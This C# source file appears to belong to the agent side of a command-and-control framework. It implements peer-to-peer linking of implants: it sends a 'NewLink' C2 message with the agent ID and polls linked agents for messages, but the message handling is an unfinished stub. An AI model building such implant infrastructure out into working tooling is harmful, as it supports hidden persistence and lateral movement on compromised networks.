using Agent.Interfaces;
using Agent.Utilities;
using Shared.Models;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Controllers
{
    public class PeerToPeerController
    {
        AgentController Agent;

        Dictionary<string, ICommModule> ConnectedAgents = new Dictionary<string, ICommModule>();

        public PeerToPeerController(AgentController Agent)
        {
            this.Agent = Agent;
        }

        public void Start()
        {
            Task.Factory.StartNew(delegate ()
            {
                while (true)
                {
                    foreach (var module in ConnectedAgents.Values.ToArray())
                    {
                        if (module.RecvData(out AgentMessage Message))
                        {
                            var x = Message;
                        }
                    }

                    Thread.Sleep(1000);
                }
            });
        }

        public void LinkAgent(ICommModule CommModule)
        {
            var c2Data = Shared.Utilities.Utilities.SerialiseData(new C2Data
            {
                Module = "Core",
                Command = "NewLink",
                Data = Encoding.UTF8.GetBytes(Agent.AgentID)
            });

            CommModule.SendData(new AgentMessage
            {
                Data = c2Data
            });

            CommModule.Start();

            var placeholder = Shared.Utilities.Utilities.GetRandomString(6);
            ConnectedAgents.Add(placeholder, CommModule);
        }
    }
}